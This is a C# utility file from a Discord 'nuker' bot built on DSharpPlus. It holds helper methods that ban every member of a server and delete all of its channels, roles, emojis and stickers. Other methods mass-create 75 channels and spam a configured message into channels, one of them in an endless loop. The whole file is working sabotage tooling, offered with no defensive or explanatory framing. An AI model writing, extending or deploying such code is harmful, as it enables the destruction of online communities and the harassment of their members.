using DSharpPlus;
using DSharpPlus.CommandsNext;
using DSharpPlus.Entities;

namespace NukerBot.src.Utils;

public static class NukingUtils
{
    public static Task BanAllMembersAsync(IEnumerable<DiscordMember> members) =>
        Task.WhenAll(members.Select(xm => xm.BanAsync()));

    public static Task DeleteAllChannelsAsync(IEnumerable<DiscordChannel> channels) =>
        Task.WhenAll(channels.Select(xc => xc.DeleteAsync()));

    public static Task DeleteAllRolesAsync(IEnumerable<DiscordRole> roles) =>
        Task.WhenAll(roles.Select(xr => xr.DeleteAsync()));

    public static Task DeleteAllEmojisAsync(IEnumerable<DiscordGuildEmoji> emojis, DiscordGuild guild) =>
        Task.WhenAll(emojis.Select(xe => guild.DeleteEmojiAsync(xe)));

    public static Task DeleteAllStickersAsync(IEnumerable<DiscordMessageSticker> stickers, DiscordGuild guild) =>
        Task.WhenAll(stickers.Select(xs => guild.DeleteStickerAsync(xs)));

    public static Task SpamChannelsAsync(IEnumerable<DiscordChannel> channels, Config config) =>
        Task.WhenAll(channels.Select(xc => xc.SendMessageAsync(config.Nuking.Options.Channel.Message)));

    public static Task<DiscordChannel[]> CreateChannelsAsync(DiscordGuild guild, Config config) =>
        Task.WhenAll(
            from _ in Enumerable.Range(0, 75)
            select guild.CreateTextChannelAsync(config.Nuking.Options.Channel.Name)
        );

    public static Task EradicateAsync(IEnumerable<DiscordChannel> channels, Config config) => Task.Run(async () =>
    {
        while (true)
        {
            await SpamChannelsAsync(channels, config);
        }
    });
}